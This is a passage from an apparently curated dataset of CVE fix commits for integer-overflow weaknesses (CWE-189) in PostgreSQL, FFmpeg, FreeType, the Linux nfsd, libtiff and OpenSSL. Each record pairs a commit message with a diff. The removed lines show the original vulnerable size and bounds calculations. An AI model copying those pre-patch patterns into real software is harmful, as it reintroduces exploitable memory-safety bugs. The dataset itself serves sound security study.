ITEMSIZE)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t errmsg(\"number of levels (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\tnum, (int) (MaxAllocSize \/ ITEMSIZE))));\n \tcurqlevel = tmpql = (lquery_level *) palloc0(ITEMSIZE * num);\n \tptr = buf;\n \twhile (*ptr)\ndiff --git a\/contrib\/ltree\/ltxtquery_io.c b\/contrib\/ltree\/ltxtquery_io.c\nindex 583ff2aaebbb..982186581a3a 100644\n--- a\/contrib\/ltree\/ltxtquery_io.c\n+++ b\/contrib\/ltree\/ltxtquery_io.c\n@@ -9,6 +9,7 @@\n \n #include \"crc32.h\"\n #include \"ltree.h\"\n+#include \"miscadmin.h\"\n \n PG_FUNCTION_INFO_V1(ltxtq_in);\n Datum\t\tltxtq_in(PG_FUNCTION_ARGS);\n@@ -212,6 +213,9 @@ makepol(QPRS_STATE *state)\n \tint32\t\tlenstack = 0;\n \tuint16\t\tflag = 0;\n \n+\t\/* since this function recurses, it could be driven to stack overflow *\/\n+\tcheck_stack_depth();\n+\n \twhile ((type = gettoken_query(state, &val, &lenval, &strval, &flag)) != END)\n \t{\n \t\tswitch (type)\n@@ -276,6 +280,9 @@ makepol(QPRS_STATE *state)\n static void\n findoprnd(ITEM *ptr, int32 *pos)\n {\n+\t\/* since this function recurses, it could be driven to stack overflow. *\/\n+\tcheck_stack_depth();\n+\n \tif (ptr[*pos].type == VAL || ptr[*pos].type == VALTRUE)\n \t{\n \t\tptr[*pos].left = 0;\n@@ -340,8 +347,12 @@ queryin(char *buf)\n \t\t\t\t errmsg(\"syntax error\"),\n \t\t\t\t errdetail(\"Empty query.\")));\n \n-\t\/* make finish struct *\/\n+\tif (LTXTQUERY_TOO_BIG(state.num, state.sumlen))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"ltxtquery is too large\")));\n \tcommonlen = COMPUTESIZE(state.num, state.sumlen);\n+\n \tquery = (ltxtquery *) palloc(commonlen);\n \tSET_VARSIZE(query, commonlen);\n \tquery->size = state.num;\ndiff --git a\/src\/backend\/utils\/adt\/geo_ops.c b\/src\/backend\/utils\/adt\/geo_ops.c\nindex 0a68be66ef00..f267920649a4 100644\n--- a\/src\/backend\/utils\/adt\/geo_ops.c\n+++ b\/src\/backend\/utils\/adt\/geo_ops.c\n@@ -1366,6 +1366,7 @@ path_in(PG_FUNCTION_ARGS)\n \tchar\t   *s;\n \tint\t\t\tnpts;\n \tint\t\t\tsize;\n+\tint\t\t\tbase_size;\n \tint\t\t\tdepth = 0;\n \n \tif ((npts = pair_count(str, ',')) <= 0)\n@@ -1384,7 +1385,15 @@ path_in(PG_FUNCTION_ARGS)\n \t\tdepth++;\n \t}\n \n-\tsize = offsetof(PATH, p[0]) +sizeof(path->p[0]) * npts;\n+\tbase_size = sizeof(path->p[0]) * npts;\n+\tsize = offsetof(PATH, p[0]) + base_size;\n+\n+\t\/* Check for integer overflow *\/\n+\tif (base_size \/ npts != sizeof(path->p[0]) || size <= base_size)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"too many points requested\")));\n+\n \tpath = (PATH *) palloc(size);\n \n \tSET_VARSIZE(path, size);\n@@ -3429,6 +3438,7 @@ poly_in(PG_FUNCTION_ARGS)\n \tPOLYGON    *poly;\n \tint\t\t\tnpts;\n \tint\t\t\tsize;\n+\tint\t\t\tbase_size;\n \tint\t\t\tisopen;\n \tchar\t   *s;\n \n@@ -3437,7 +3447,15 @@ poly_in(PG_FUNCTION_ARGS)\n \t\t\t\t(errcode(ERRCODE_INVALID_TEXT_REPRESENTATION),\n \t\t\t  errmsg(\"invalid input syntax for type polygon: \\\"%s\\\"\", str)));\n \n-\tsize = offsetof(POLYGON, p[0]) +sizeof(poly->p[0]) * npts;\n+\tbase_size = sizeof(poly->p[0]) * npts;\n+\tsize = offsetof(POLYGON, p[0]) + base_size;\n+\n+\t\/* Check for integer overflow *\/\n+\tif (base_size \/ npts != sizeof(poly->p[0]) || size <= base_size)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"too many points requested\")));\n+\n \tpoly = (POLYGON *) palloc0(size);\t\/* zero any holes *\/\n \n \tSET_VARSIZE(poly, size);\n@@ -4343,6 +4361,10 @@ path_poly(PG_FUNCTION_ARGS)\n \t\t\t\t(errcode(ERRCODE_INVALID_PARAMETER_VALUE),\n \t\t\t\t errmsg(\"open path cannot be converted to polygon\")));\n \n+\t\/*\n+\t * Never overflows: the old size fit in MaxAllocSize, and the new size is\n+\t * just a small constant larger.\n+\t *\/\n \tsize = offsetof(POLYGON, p[0]) +sizeof(poly->p[0]) * path->npts;\n \tpoly = (POLYGON *) palloc(size);\n \n@@ -4448,6 +4470,10 @@ poly_path(PG_FUNCTION_ARGS)\n \tint\t\t\tsize;\n \tint\t\t\ti;\n \n+\t\/*\n+\t * Never overflows: the old size fit in MaxAllocSize, and the new size is\n+\t * smaller by a small constant.\n+\t *\/\n \tsize = offsetof(PATH, p[0]) +sizeof(path->p[0]) * poly->npts;\n \tpath = (PATH *) palloc(size);\n \ndiff --git a\/src\/backend\/utils\/adt\/tsquery.c b\/src\/backend\/utils\/adt\/tsquery.c\nindex 90ca37b0f773..b973a534ddb0 100644\n--- a\/src\/backend\/utils\/adt\/tsquery.c\n+++ b\/src\/backend\/utils\/adt\/tsquery.c\n@@ -514,8 +514,13 @@ parse_tsquery(char *buf,\n \t\treturn query;\n \t}\n \n-\t\/* Pack the QueryItems in the final TSQuery struct to return to caller *\/\n+\tif (TSQUERY_TOO_BIG(list_length(state.polstr), state.sumlen))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"tsquery is too large\")));\n \tcommonlen = COMPUTESIZE(list_length(state.polstr), state.sumlen);\n+\n+\t\/* Pack the QueryItems in the final TSQuery struct to return to caller *\/\n \tquery = (TSQuery) palloc0(commonlen);\n \tSET_VARSIZE(query, commonlen);\n \tquery->size = list_length(state.polstr);\ndiff --git a\/src\/backend\/utils\/adt\/tsquery_util.c b\/src\/backend\/utils\/adt\/tsquery_util.c\nindex 34587980c75a..8a41fbc531ad 100644\n--- a\/src\/backend\/utils\/adt\/tsquery_util.c\n+++ b\/src\/backend\/utils\/adt\/tsquery_util.c\n@@ -333,6 +333,11 @@ QTN2QT(QTNode *in)\n \tQTN2QTState state;\n \n \tcntsize(in, &sumlen, &nnode);\n+\n+\tif (TSQUERY_TOO_BIG(nnode, sumlen))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"tsquery is too large\")));\n \tlen = COMPUTESIZE(nnode, sumlen);\n \n \tout = (TSQuery) palloc0(len);\ndiff --git a\/src\/backend\/utils\/adt\/txid.c b\/src\/backend\/utils\/adt\/txid.c\nindex 56d599f07d71..a005e676b5e9 100644\n--- a\/src\/backend\/utils\/adt\/txid.c\n+++ b\/src\/backend\/utils\/adt\/txid.c\n@@ -26,7 +26,9 @@\n #include \"funcapi.h\"\n #include \"miscadmin.h\"\n #include \"libpq\/pqformat.h\"\n+#include \"postmaster\/postmaster.h\"\n #include \"utils\/builtins.h\"\n+#include \"utils\/memutils.h\"\n #include \"utils\/snapmgr.h\"\n \n \n@@ -66,6 +68,8 @@ typedef struct\n \n #define TXID_SNAPSHOT_SIZE(nxip) \\\n \t(offsetof(TxidSnapshot, xip) + sizeof(txid) * (nxip))\n+#define TXID_SNAPSHOT_MAX_NXIP \\\n+\t((MaxAllocSize - offsetof(TxidSnapshot, xip)) \/ sizeof(txid))\n \n \/*\n  * Epoch values from xact.c\n@@ -368,6 +372,13 @@ txid_current_snapshot(PG_FUNCTION_ARGS)\n \n \tload_xid_epoch(&state);\n \n+\t\/*\n+\t * Compile-time limits on the procarray (MAX_BACKENDS processes plus\n+\t * MAX_BACKENDS prepared transactions) guarantee nxip won't be too large.\n+\t *\/\n+\tStaticAssertStmt(MAX_BACKENDS * 2 <= TXID_SNAPSHOT_MAX_NXIP,\n+\t\t\t\t\t \"possible overflow in txid_current_snapshot()\");\n+\n \t\/* allocate *\/\n \tnxip = cur->xcnt;\n \tsize = TXID_SNAPSHOT_SIZE(nxip);\n@@ -445,20 +456,12 @@ txid_snapshot_recv(PG_FUNCTION_ARGS)\n \ttxid\t\tlast = 0;\n \tint\t\t\tnxip;\n \tint\t\t\ti;\n-\tint\t\t\tavail;\n-\tint\t\t\texpect;\n \ttxid\t\txmin,\n \t\t\t\txmax;\n \n-\t\/*\n-\t * load nxip and check for nonsense.\n-\t *\n-\t * (nxip > avail) check is against int overflows in 'expect'.\n-\t *\/\n+\t\/* load and validate nxip *\/\n \tnxip = pq_getmsgint(buf, 4);\n-\tavail = buf->len - buf->cursor;\n-\texpect = 8 + 8 + nxip * 8;\n-\tif (nxip < 0 || nxip > avail || expect > avail)\n+\tif (nxip < 0 || nxip > TXID_SNAPSHOT_MAX_NXIP)\n \t\tgoto bad_format;\n \n \txmin = pq_getmsgint64(buf);\ndiff --git a\/src\/backend\/utils\/adt\/varbit.c b\/src\/backend\/utils\/adt\/varbit.c\nindex 22c04be307c2..e3de952863d9 100644\n--- a\/src\/backend\/utils\/adt\/varbit.c\n+++ b\/src\/backend\/utils\/adt\/varbit.c\n@@ -148,12 +148,22 @@ bit_in(PG_FUNCTION_ARGS)\n \t\tsp = input_string;\n \t}\n \n+\t\/*\n+\t * Determine bitlength from input string.  MaxAllocSize ensures a regular\n+\t * input is small enough, but we must check hex input.\n+\t *\/\n \tslen = strlen(sp);\n-\t\/* Determine bitlength from input string *\/\n \tif (bit_not_hex)\n \t\tbitlen = slen;\n \telse\n+\t{\n+\t\tif (slen > VARBITMAXLEN \/ 4)\n+\t\t\tereport(ERROR,\n+\t\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"bit string length exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t\tVARBITMAXLEN)));\n \t\tbitlen = slen * 4;\n+\t}\n \n \t\/*\n \t * Sometimes atttypmod is not supplied. If it is supplied we need to make\n@@ -450,12 +460,22 @@ varbit_in(PG_FUNCTION_ARGS)\n \t\tsp = input_string;\n \t}\n \n+\t\/*\n+\t * Determine bitlength from input string.  MaxAllocSize ensures a regular\n+\t * input is small enough, but we must check hex input.\n+\t *\/\n \tslen = strlen(sp);\n-\t\/* Determine bitlength from input string *\/\n \tif (bit_not_hex)\n \t\tbitlen = slen;\n \telse\n+\t{\n+\t\tif (slen > VARBITMAXLEN \/ 4)\n+\t\t\tereport(ERROR,\n+\t\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"bit string length exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t\tVARBITMAXLEN)));\n \t\tbitlen = slen * 4;\n+\t}\n \n \t\/*\n \t * Sometimes atttypmod is not supplied. If it is supplied we need to make\n@@ -535,6 +555,9 @@ varbit_in(PG_FUNCTION_ARGS)\n \/*\n  * varbit_out -\n  *\t  Prints the string as bits to preserve length accurately\n+ *\n+ * XXX varbit_recv() and hex input to varbit_in() can load a value that this\n+ * cannot emit.  Consider using hex output for such values.\n  *\/\n Datum\n varbit_out(PG_FUNCTION_ARGS)\n@@ -944,6 +967,11 @@ bit_catenate(VarBit *arg1, VarBit *arg2)\n \tbitlen1 = VARBITLEN(arg1);\n \tbitlen2 = VARBITLEN(arg2);\n \n+\tif (bitlen1 > VARBITMAXLEN - bitlen2)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"bit string length exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t\tVARBITMAXLEN)));\n \tbytelen = VARBITTOTALLEN(bitlen1 + bitlen2);\n \n \tresult = (VarBit *) palloc(bytelen);\ndiff --git a\/src\/include\/tsearch\/ts_type.h b\/src\/include\/tsearch\/ts_type.h\nindex 4e253fb9d3b0..df4a57825ecb 100644\n--- a\/src\/include\/tsearch\/ts_type.h\n+++ b\/src\/include\/tsearch\/ts_type.h\n@@ -13,6 +13,7 @@\n #define _PG_TSTYPE_H_\n \n #include \"fmgr.h\"\n+#include \"utils\/memutils.h\"\n #include \"utils\/pg_crc.h\"\n \n \n@@ -244,6 +245,8 @@ typedef TSQueryData *TSQuery;\n  * QueryItems, and lenofoperand is the total length of all operands\n  *\/\n #define COMPUTESIZE(size, lenofoperand) ( HDRSIZETQ + (size) * sizeof(QueryItem) + (lenofoperand) )\n+#define TSQUERY_TOO_BIG(size, lenofoperand) \\\n+\t((size) > (MaxAllocSize - HDRSIZETQ - (lenofoperand)) \/ sizeof(QueryItem))\n \n \/* Returns a pointer to the first QueryItem in a TSQuery *\/\n #define GETQUERY(x)  ((QueryItem*)( (char*)(x)+HDRSIZETQ ))\ndiff --git a\/src\/include\/utils\/varbit.h b\/src\/include\/utils\/varbit.h\nindex 773b4ce050e7..974de7db0923 100644\n--- a\/src\/include\/utils\/varbit.h\n+++ b\/src\/include\/utils\/varbit.h\n@@ -15,6 +15,8 @@\n #ifndef VARBIT_H\n #define VARBIT_H\n \n+#include <limits.h>\n+\n #include \"fmgr.h\"\n \n \/*\n@@ -53,6 +55,11 @@ typedef struct\n \/* Number of bytes needed to store a bit string of a given length *\/\n #define VARBITTOTALLEN(BITLEN)\t(((BITLEN) + BITS_PER_BYTE-1)\/BITS_PER_BYTE + \\\n \t\t\t\t\t\t\t\t VARHDRSZ + VARBITHDRSZ)\n+\/*\n+ * Maximum number of bits.  Several code sites assume no overflow from\n+ * computing bitlen + X; VARBITTOTALLEN() has the largest such X.\n+ *\/\n+#define VARBITMAXLEN\t\t(INT_MAX - BITS_PER_BYTE + 1)\n \/* pointer beyond the end of the bit string (like end() in STL containers) *\/\n #define VARBITEND(PTR)\t\t(((bits8 *) (PTR)) + VARSIZE(PTR))\n \/* Mask that will cover exactly one byte, i.e. BITS_PER_BYTE bits *\/\n","owner":"postgres","repo":"postgres","source":"cve"},{"CVE_ID":"CVE-2013-0855","CWE_ID":"189","category":"security","commit_id":"3920d1387834e2bc334aff9f518f4beb24e470bd","commit_message":"From 3920d1387834e2bc334aff9f518f4beb24e470bd Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Sat, 10 Nov 2012 17:41:56 +0100\nSubject: [PATCH] alac: fix integer overflow leading to subsequent out of array\n accesses.\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/alac.c | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/alac.c b\/libavcodec\/alac.c\nindex f032ceb9cc..46c3a5b37b 100644\n--- a\/libavcodec\/alac.c\n+++ b\/libavcodec\/alac.c\n@@ -542,7 +542,11 @@ static av_cold int alac_decode_close(AVCodecContext *avctx)\n static int allocate_buffers(ALACContext *alac)\n {\n     int ch;\n-    int buf_size = alac->max_samples_per_frame * sizeof(int32_t);\n+    int buf_size;\n+\n+    if (alac->max_samples_per_frame > INT_MAX \/ sizeof(int32_t))\n+        goto buf_alloc_fail;\n+    buf_size = alac->max_samples_per_frame * sizeof(int32_t);\n \n     for (ch = 0; ch < FFMIN(alac->channels, 2); ch++) {\n         FF_ALLOC_OR_GOTO(alac->avctx, alac->predict_error_buffer[ch],\n-- \n2.11.0\n\n","owner":"FFmpeg","repo":"FFmpeg","source":"cve"},{"CVE_ID":"CVE-2009-0946","CWE_ID":"189","category":"security","commit_id":"a18788b14db60ae3673f932249cd02d33a227c4e","commit_message":"From a18788b14db60ae3673f932249cd02d33a227c4e Mon Sep 17 00:00:00 2001\nFrom: Werner Lemberg <wl@gnu.org>\nDate: Fri, 20 Mar 2009 08:03:58 +0100\nSubject: Fix validation for various cmap table formats.\n\n* src\/sfnt\/ttcmap.c (tt_cmap8_validate, tt_cmap10_validate,\ntt_cmap12_validate): Check `length' correctly.\n(tt_cmap_14_validate): Check `length' and `numMappings' correctly.\n---\n ChangeLog         |  9 +++++++++\n src\/sfnt\/ttcmap.c | 13 ++++++++-----\n 2 files changed, 17 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex f208f51..d894b37 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,4 +1,13 @@\n 2009-03-20  Werner Lemberg  <wl@gnu.org>\n+\t    Tavis Ormandy <taviso@google.com>\n+\n+\tFix validation for various cmap table formats.\n+\n+\t* src\/sfnt\/ttcmap.c (tt_cmap8_validate, tt_cmap10_validate,\n+\ttt_cmap12_validate): Check `length' correctly.\n+\t(tt_cmap_14_validate): Check `length' and `numMappings' correctly.\n+\n+2009-03-20  Werner Lemberg  <wl@gnu.org>\n \n \tProtect against malformed compressed data.\n \ndiff --git a\/src\/sfnt\/ttcmap.c b\/src\/sfnt\/ttcmap.c\nindex 6830391..1bd2ce7 100644\n--- a\/src\/sfnt\/ttcmap.c\n+++ b\/src\/sfnt\/ttcmap.c\n@@ -1635,7 +1635,7 @@\n       FT_INVALID_TOO_SHORT;\n \n     length = TT_NEXT_ULONG( p );\n-    if ( table + length > valid->limit || length < 8208 )\n+    if ( length > (FT_UInt32)( valid->limit - table ) || length < 8192 + 16 )\n       FT_INVALID_TOO_SHORT;\n \n     is32       = table + 12;\n@@ -1863,7 +1863,8 @@\n     p      = table + 16;\n     count  = TT_NEXT_ULONG( p );\n \n-    if ( table + length > valid->limit || length < 20 + count * 2 )\n+    if ( length > (FT_ULong)( valid->limit - table ) ||\n+         length < 20 + count * 2                     )\n       FT_INVALID_TOO_SHORT;\n \n     \/* check glyph indices *\/\n@@ -2048,7 +2049,8 @@\n     p          = table + 12;\n     num_groups = TT_NEXT_ULONG( p );\n \n-    if ( table + length > valid->limit || length < 16 + 12 * num_groups )\n+    if ( length > (FT_ULong)( valid->limit - table ) ||\n+         length < 16 + 12 * num_groups               )\n       FT_INVALID_TOO_SHORT;\n \n     \/* check groups, they must be in increasing order *\/\n@@ -2429,7 +2431,8 @@\n     FT_ULong  num_selectors = TT_NEXT_ULONG( p );\n \n \n-    if ( table + length > valid->limit || length < 10 + 11 * num_selectors )\n+    if ( length > (FT_ULong)( valid->limit - table ) ||\n+         length < 10 + 11 * num_selectors            )\n       FT_INVALID_TOO_SHORT;\n \n     \/* check selectors, they must be in increasing order *\/\n@@ -2491,7 +2494,7 @@\n           FT_ULong  i, lastUni = 0;\n \n \n-          if ( ndp + numMappings * 4 > valid->limit )\n+          if ( numMappings * 4 > (FT_ULong)( valid->limit - ndp ) )\n             FT_INVALID_TOO_SHORT;\n \n           for ( i = 0; i < numMappings; ++i )\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-5479","CWE_ID":"189","category":"security","commit_id":"0a49a62f998747cfa564d98d36a459fe70d3299b","commit_message":"From 0a49a62f998747cfa564d98d36a459fe70d3299b Mon Sep 17 00:00:00 2001\nFrom: Luca Barbato <lu_zero@gentoo.org>\nDate: Fri, 26 Jun 2015 15:57:16 +0200\nSubject: [PATCH] h263: Always check both dimensions\n\nCC: libav-stable@libav.org\nFound-By: ago@gentoo.org\n---\n libavcodec\/ituh263dec.c | 8 +++++---\n 1 file changed, 5 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/ituh263dec.c b\/libavcodec\/ituh263dec.c\nindex b1da22f..b9189b2 100644\n--- a\/libavcodec\/ituh263dec.c\n+++ b\/libavcodec\/ituh263dec.c\n@@ -30,6 +30,7 @@\n #include <limits.h>\n \n #include \"libavutil\/attributes.h\"\n+#include \"libavutil\/imgutils.h\"\n #include \"libavutil\/internal.h\"\n #include \"libavutil\/mathematics.h\"\n #include \"avcodec.h\"\n@@ -868,7 +869,7 @@ end:\n \/* most is hardcoded. should extend to handle all h263 streams *\/\n int ff_h263_decode_picture_header(MpegEncContext *s)\n {\n-    int format, width, height, i;\n+    int format, width, height, i, ret;\n     uint32_t startcode;\n \n     align_get_bits(&s->gb);\n@@ -919,8 +920,6 @@ int ff_h263_decode_picture_header(MpegEncContext *s)\n         \/* H.263v1 *\/\n         width = ff_h263_format[format][0];\n         height = ff_h263_format[format][1];\n-        if (!width)\n-            return -1;\n \n         s->pict_type = AV_PICTURE_TYPE_I + get_bits1(&s->gb);\n \n@@ -1073,6 +1072,9 @@ int ff_h263_decode_picture_header(MpegEncContext *s)\n         s->qscale = get_bits(&s->gb, 5);\n     }\n \n+    if ((ret = av_image_check_size(s->width, s->height, 0, s)) < 0)\n+        return ret;\n+\n     s->mb_width = (s->width  + 15) \/ 16;\n     s->mb_height = (s->height  + 15) \/ 16;\n     s->mb_num = s->mb_width * s->mb_height;\n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-7895","CWE_ID":"189","category":"security","commit_id":"13bf9fbff0e5e099e2b6f003a0ab8ae145436309","commit_message":"From 13bf9fbff0e5e099e2b6f003a0ab8ae145436309 Mon Sep 17 00:00:00 2001\nFrom: \"J. Bruce Fields\" <bfields@redhat.com>\nDate: Fri, 21 Apr 2017 15:26:30 -0400\nSubject: nfsd: stricter decoding of write-like NFSv2\/v3 ops\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nThe NFSv2\/v3 code does not systematically check whether we decode past\nthe end of the buffer.  This generally appears to be harmless, but there\nare a few places where we do arithmetic on the pointers involved and\ndon't account for the possibility that a length could be negative.  Add\nchecks to catch these.\n\nReported-by: Tuomas Haanp\u00e4\u00e4 <thaan@synopsys.com>\nReported-by: Ari Kauppi <ari@synopsys.com>\nReviewed-by: NeilBrown <neilb@suse.com>\nCc: stable@vger.kernel.org\nSigned-off-by: J. Bruce Fields <bfields@redhat.com>\n---\n fs\/nfsd\/nfs3xdr.c | 4 ++++\n fs\/nfsd\/nfsxdr.c  | 2 ++\n 2 files changed, 6 insertions(+)\n\n","diff_code":"diff --git a\/fs\/nfsd\/nfs3xdr.c b\/fs\/nfsd\/nfs3xdr.c\nindex d18cfddbe115..452334694a5d 100644\n--- a\/fs\/nfsd\/nfs3xdr.c\n+++ b\/fs\/nfsd\/nfs3xdr.c\n@@ -369,6 +369,8 @@ nfs3svc_decode_writeargs(struct svc_rqst *rqstp, __be32 *p,\n \targs->count = ntohl(*p++);\n \targs->stable = ntohl(*p++);\n \tlen = args->len = ntohl(*p++);\n+\tif ((void *)p > head->iov_base + head->iov_len)\n+\t\treturn 0;\n \t\/*\n \t * The count must equal the amount of data passed.\n \t *\/\n@@ -472,6 +474,8 @@ nfs3svc_decode_symlinkargs(struct svc_rqst *rqstp, __be32 *p,\n \t\/* first copy and check from the first page *\/\n \told = (char*)p;\n \tvec = &rqstp->rq_arg.head[0];\n+\tif ((void *)old > vec->iov_base + vec->iov_len)\n+\t\treturn 0;\n \tavail = vec->iov_len - (old - (char*)vec->iov_base);\n \twhile (len && avail && *old) {\n \t\t*new++ = *old++;\ndiff --git a\/fs\/nfsd\/nfsxdr.c b\/fs\/nfsd\/nfsxdr.c\nindex 59bd88a23a3d..de07ff625777 100644\n--- a\/fs\/nfsd\/nfsxdr.c\n+++ b\/fs\/nfsd\/nfsxdr.c\n@@ -302,6 +302,8 @@ nfssvc_decode_writeargs(struct svc_rqst *rqstp, __be32 *p,\n \t * bytes.\n \t *\/\n \thdr = (void*)p - head->iov_base;\n+\tif (hdr > head->iov_len)\n+\t\treturn 0;\n \tdlen = head->iov_len + rqstp->rq_arg.page_len - hdr;\n \n \t\/*\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-10094","CWE_ID":"189","category":"security","commit_id":"c7153361a4041260719b340f73f2f76b0969235c","commit_message":"From c7153361a4041260719b340f73f2f76b0969235c Mon Sep 17 00:00:00 2001\nFrom: erouault <erouault>\nDate: Tue, 20 Dec 2016 17:28:17 +0000\nSubject: [PATCH] * tools\/tiff2pdf.c: avoid potential heap-based overflow in\n t2p_readwrite_pdf_image_tile(). Fixes\n http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2640\n\n---\n ChangeLog        | 6 ++++++\n tools\/tiff2pdf.c | 2 +-\n 2 files changed, 7 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex 6be36026..91ba4e6e 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,3 +1,9 @@\n+2016-12-20 Even Rouault <even.rouault at spatialys.com>\n+\n+\t* tools\/tiff2pdf.c: avoid potential heap-based overflow in\n+\tt2p_readwrite_pdf_image_tile().\n+\tFixes http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2640\n+\n 2016-12-20 Even Rouault <even.rouault at spatialys.com>\n \n \t* tools\/tiff2pdf.c: avoid potential invalid memory read in\ndiff --git a\/tools\/tiff2pdf.c b\/tools\/tiff2pdf.c\nindex 47d76298..db196e04 100644\n--- a\/tools\/tiff2pdf.c\n+++ b\/tools\/tiff2pdf.c\n@@ -2895,7 +2895,7 @@ tsize_t t2p_readwrite_pdf_image_tile(T2P* t2p, TIFF* input, TIFF* output, ttile_\n \t\t\t\treturn(0);\n \t\t\t}\n \t\t\tif(TIFFGetField(input, TIFFTAG_JPEGTABLES, &count, &jpt) != 0) {\n-\t\t\t\tif (count >= 4) {\n+\t\t\t\tif (count > 4) {\n                                         int retTIFFReadRawTile;\n                     \/* Ignore EOI marker of JpegTables *\/\n \t\t\t\t\t_TIFFmemcpy(buffer, jpt, count - 2);\n","owner":"vadz","repo":"libtiff","source":"cve"},{"CVE_ID":"CVE-2015-1794","CWE_ID":"189","category":"security","commit_id":"ada57746b6b80beae73111fe1291bf8dd89af91c","commit_message":"From ada57746b6b80beae73111fe1291bf8dd89af91c Mon Sep 17 00:00:00 2001\nFrom: \"Guy Leaver (guleaver)\" <guleaver@cisco.com>\nDate: Fri, 7 Aug 2015 15:45:21 +0100\nSubject: [PATCH] Fix seg fault with 0 p val in SKE\n\nIf a client receives a ServerKeyExchange for an anon DH ciphersuite with the\nvalue of p set to 0 then a seg fault can occur. This commits adds a test to\nreject p, g and pub key parameters that have a 0 value (in accordance with\nRFC 5246)\n\nThe security vulnerability only affects master and 1.0.2, but the fix is\nadditionally applied to 1.0.1 for additional confidence.\n\nCVE-2015-1794\n\nReviewed-by: Richard Levitte <levitte@openssl.org>\nReviewed-by: Matt Caswell <matt@openssl.org>\n---\n ssl\/s3_clnt.c | 16 ++++++++++++++++\n ssl\/ssl.h     |  3 +++\n ssl\/ssl_err.c |  3 +++\n 3 files changed, 22 insertions(+)\n\n","diff_code":"diff --git a\/ssl\/s3_clnt.c b\/ssl\/s3_clnt.c\nindex 6af145a8b7..2059151a46 100644\n--- a\/ssl\/s3_clnt.c\n+++ b\/ssl\/s3_clnt.c\n@@ -1699,6 +1699,12 @@ int ssl3_get_key_exchange(SSL *s)\n         }\n         p += i;\n \n+        if (BN_is_zero(dh->p)) {\n+            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_P_VALUE);\n+            goto f_err;\n+        }\n+\n+\n         if (2 > n - param_len) {\n             SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n             goto f_err;\n@@ -1719,6 +1725,11 @@ int ssl3_get_key_exchange(SSL *s)\n         }\n         p += i;\n \n+        if (BN_is_zero(dh->g)) {\n+            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_G_VALUE);\n+            goto f_err;\n+        }\n+\n         if (2 > n - param_len) {\n             SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n             goto f_err;\n@@ -1740,6 +1751,11 @@ int ssl3_get_key_exchange(SSL *s)\n         p += i;\n         n -= param_len;\n \n+        if (BN_is_zero(dh->pub_key)) {\n+            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_PUB_KEY_VALUE);\n+            goto f_err;\n+        }\n+\n # ifndef OPENSSL_NO_RSA\n         if (alg_a & SSL_aRSA)\n             pkey =\ndiff --git a\/ssl\/ssl.h b\/ssl\/ssl.h\nindex 6fe1a2474d..c6c5bce4af 100644\n--- a\/ssl\/ssl.h\n+++ b\/ssl\/ssl.h\n@@ -2846,8 +2846,11 @@ void ERR_load_SSL_strings(void);\n # define SSL_R_BAD_DATA_RETURNED_BY_CALLBACK              106\n # define SSL_R_BAD_DECOMPRESSION                          107\n # define SSL_R_BAD_DH_G_LENGTH                            108\n+# define SSL_R_BAD_DH_G_VALUE                             375\n # define SSL_R_BAD_DH_PUB_KEY_LENGTH                      109\n+# define SSL_R_BAD_DH_PUB_KEY_VALUE                       393\n # define SSL_R_BAD_DH_P_LENGTH                            110\n+# define SSL_R_BAD_DH_P_VALUE                             395\n # define SSL_R_BAD_DIGEST_LENGTH                          111\n # define SSL_R_BAD_DSA_SIGNATURE                          112\n # define SSL_R_BAD_ECC_CERT                               304\ndiff --git a\/ssl\/ssl_err.c 